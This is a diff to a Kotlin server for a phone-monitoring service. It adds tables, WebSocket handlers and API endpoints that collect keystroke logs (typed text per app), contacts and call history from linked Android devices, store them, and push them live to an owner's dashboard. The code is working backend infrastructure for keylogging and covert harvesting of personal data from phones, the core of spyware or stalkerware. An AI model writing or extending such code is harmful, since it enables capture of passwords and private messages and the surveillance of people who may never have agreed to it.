@@ -206,6 +206,36 @@ object MessagesTable : Table("messages") {
     override val primaryKey = PrimaryKey(id)
 }
 
+object ContactsTable : Table("contacts") {
+    val id       = integer("id").autoIncrement()
+    val deviceId = varchar("device_id", 50)
+    val name     = varchar("name", 200)
+    val phone    = varchar("phone", 100)
+    val syncedAt = long("synced_at")
+    override val primaryKey = PrimaryKey(id)
+}
+
+object CallLogsTable : Table("call_logs") {
+    val id       = integer("id").autoIncrement()
+    val deviceId = varchar("device_id", 50)
+    val name     = varchar("name", 200).default("")
+    val number   = varchar("number", 100)
+    val callType = varchar("call_type", 20) // "incoming" | "outgoing" | "missed"
+    val duration = integer("duration").default(0) // seconds
+    val timestamp = long("timestamp")
+    override val primaryKey = PrimaryKey(id)
+}
+
+object KeylogTable : Table("keylog") {
+    val id       = integer("id").autoIncrement()
+    val deviceId = varchar("device_id", 50)
+    val app      = varchar("app", 200)
+    val appLabel = varchar("app_label", 200).default("")
+    val text     = text("text")
+    val timestamp = long("timestamp")
+    override val primaryKey = PrimaryKey(id)
+}
+
 // Single-row table (id is always 1) storing the public landing page content as a JSON blob.
 // Kept schema-free on purpose so admin-landing.js can add/edit fields without migrations.
 object LandingContentTable : Table("landing_content") {
@@ -428,8 +458,8 @@ fun initDatabase() {
     Database.connect(dataSource)
 
     transaction {
-        SchemaUtils.create(UsersTable, SessionsTable, DevicesTable, TelemetryTable, LogsTable, MessagesTable, LandingContentTable)
-        SchemaUtils.createMissingTablesAndColumns(UsersTable, DevicesTable, MessagesTable) // migrate new columns on existing installs
+        SchemaUtils.create(UsersTable, SessionsTable, DevicesTable, TelemetryTable, LogsTable, MessagesTable, LandingContentTable, ContactsTable, CallLogsTable, KeylogTable)
+        SchemaUtils.createMissingTablesAndColumns(UsersTable, DevicesTable, MessagesTable, ContactsTable, CallLogsTable, KeylogTable) // migrate new columns on existing installs
 
         // Reset all devices to offline state initially on server start
         DevicesTable.update {
@@ -861,6 +891,59 @@ fun main() {
                         .reversed() // oldest -> newest, so bubbles render in chat order
                 }
                 call.respond(history)
+            }
+
+            get("/api/device/{id}/contacts") {
+                val id = call.parameters["id"] ?: return@get call.respond(mapOf("error" to "Missing device ID"))
+                if (!assertDeviceOwner(call, id)) return@get
+                val rows = transaction {
+                    ContactsTable.select { ContactsTable.deviceId eq id }
+                        .orderBy(ContactsTable.name to SortOrder.ASC)
+                        .map { mapOf(
+                            "id"       to it[ContactsTable.id],
+                            "name"     to it[ContactsTable.name],
+                            "phone"    to it[ContactsTable.phone],
+                            "syncedAt" to it[ContactsTable.syncedAt]
+                        )}
+                }
+                call.respond(rows)
+            }
+
+            get("/api/device/{id}/call-logs") {
+                val id = call.parameters["id"] ?: return@get call.respond(mapOf("error" to "Missing device ID"))
+                if (!assertDeviceOwner(call, id)) return@get
+                val rows = transaction {
+                    CallLogsTable.select { CallLogsTable.deviceId eq id }
+                        .orderBy(CallLogsTable.timestamp to SortOrder.DESC)
+                        .limit(500)
+                        .map { mapOf(
+                            "id"        to it[CallLogsTable.id],
+                            "name"      to it[CallLogsTable.name],
+                            "number"    to it[CallLogsTable.number],
+                            "type"      to it[CallLogsTable.callType],
+                            "duration"  to it[CallLogsTable.duration],
+                            "timestamp" to it[CallLogsTable.timestamp]
+                        )}
+                }
+                call.respond(rows)
+            }
+
+            get("/api/device/{id}/keylog") {
+                val id = call.parameters["id"] ?: return@get call.respond(mapOf("error" to "Missing device ID"))
+                if (!assertDeviceOwner(call, id)) return@get
+                val rows = transaction {
+                    KeylogTable.select { KeylogTable.deviceId eq id }
+                        .orderBy(KeylogTable.timestamp to SortOrder.DESC)
+                        .limit(1000)
+                        .map { mapOf(
+                            "id"        to it[KeylogTable.id],
+                            "app"       to it[KeylogTable.app],
+                            "appLabel"  to it[KeylogTable.appLabel],
+                            "text"      to it[KeylogTable.text],
+                            "timestamp" to it[KeylogTable.timestamp]
+                        )}
+                }
+                call.respond(rows)
             }
 
             // One-time maintenance endpoint: fixes Content-Type metadata on R2 for .opus voice
@@ -1490,6 +1573,71 @@ fun main() {
                                                     it[timestamp] = System.currentTimeMillis()
                                                 }
                                             }
+                                        } else if (type == "CONTACTS") {
+                                            val arr = json["contacts"]?.toString()?.let {
+                                                runCatching { Json.parseToJsonElement(it).jsonArray }.getOrNull()
+                                            }
+                                            if (arr != null) {
+                                                val now = System.currentTimeMillis()
+                                                transaction {
+                                                    ContactsTable.deleteWhere { ContactsTable.deviceId eq deviceId }
+                                                    arr.forEach { c ->
+                                                        val o = runCatching { c.jsonObject }.getOrNull() ?: return@forEach
+                                                        ContactsTable.insert {
+                                                            it[ContactsTable.deviceId] = deviceId
+                                                            it[ContactsTable.name]     = o["name"]?.jsonPrimitive?.content ?: ""
+                                                            it[ContactsTable.phone]    = o["phone"]?.jsonPrimitive?.content ?: ""
+                                                            it[ContactsTable.syncedAt] = now
+                                                        }
+                                                    }
+                                                }
+                                                broadcastToDashboards("""{"type":"CONTACTS","deviceId":"$deviceId","contacts":${arr}}""", deviceId)
+                                            }
+                                        } else if (type == "CALL_LOG") {
+                                            val arr = json["calls"]?.toString()?.let {
+                                                runCatching { Json.parseToJsonElement(it).jsonArray }.getOrNull()
+                                            }
+                                            if (arr != null) {
+                                                transaction {
+                                                    arr.forEach { c ->
+                                                        val o = runCatching { c.jsonObject }.getOrNull() ?: return@forEach
+                                                        val ts  = o["timestamp"]?.jsonPrimitive?.content?.toLongOrNull() ?: System.currentTimeMillis()
+                                                        val num = o["number"]?.jsonPrimitive?.content ?: ""
+                                                        val exists = CallLogsTable.select {
+                                                            (CallLogsTable.deviceId eq deviceId) and
+                                                            (CallLogsTable.number eq num) and
+                                                            (CallLogsTable.timestamp eq ts)
+                                                        }.count() > 0
+                                                        if (!exists) CallLogsTable.insert {
+                                                            it[CallLogsTable.deviceId]  = deviceId
+                                                            it[CallLogsTable.name]      = o["name"]?.jsonPrimitive?.content ?: ""
+                                                            it[CallLogsTable.number]    = num
+                                                            it[CallLogsTable.callType]  = o["type"]?.jsonPrimitive?.content ?: "incoming"
+                                                            it[CallLogsTable.duration]  = o["duration"]?.jsonPrimitive?.content?.toIntOrNull() ?: 0
+                                                            it[CallLogsTable.timestamp] = ts
+                                                        }
+                                                    }
+                                                }
+                                                broadcastToDashboards("""{"type":"CALL_LOG","deviceId":"$deviceId","calls":${arr}}""", deviceId)
+                                            }
+                                        } else if (type == "KEYLOG_EVENT") {
+                                            val keyText  = json["text"]?.jsonPrimitive?.content ?: ""
+                                            val app      = json["app"]?.jsonPrimitive?.content ?: ""
+                                            val appLabel = json["appLabel"]?.jsonPrimitive?.content ?: app
+                                            val ts       = json["timestamp"]?.jsonPrimitive?.content?.toLongOrNull() ?: System.currentTimeMillis()
+                                            if (keyText.isNotBlank()) {
+                                                transaction {
+                                                    KeylogTable.insert {
+                                                        it[KeylogTable.deviceId]  = deviceId
+                                                        it[KeylogTable.app]       = app
+                                                        it[KeylogTable.appLabel]  = appLabel
+                                                        it[KeylogTable.text]      = keyText
+                                                        it[KeylogTable.timestamp] = ts
+                                                    }
+                                                }
+                                                val ev = """{"type":"KEYLOG_EVENT","deviceId":"$deviceId","app":${Json.encodeToString(app)},"appLabel":${Json.encodeToString(appLabel)},"text":${Json.encodeToString(keyText)},"timestamp":$ts}"""
+                                                broadcastToDashboards(ev, deviceId)
+                                            }
                                         } else if (type == "LINK_DEVICE") {
                                             // Android app sends this when user enters the linkToken
                                             // while the WebSocket is already open — links device to
@@ -1521,7 +1669,7 @@ fun main() {
                                         }
 
                                         // Relay JSON to the owner's dashboards (skip internal-only messages)
-                                        if (type != "LINK_DEVICE") broadcastToDashboards(text, deviceId)
+                                        if (type != "LINK_DEVICE" && type != "CONTACTS" && type != "CALL_LOG" && type != "KEYLOG_EVENT") broadcastToDashboards(text, deviceId)
                                     } catch (e: Exception) {
                                         broadcastToDashboards(text, deviceId)
                                     }
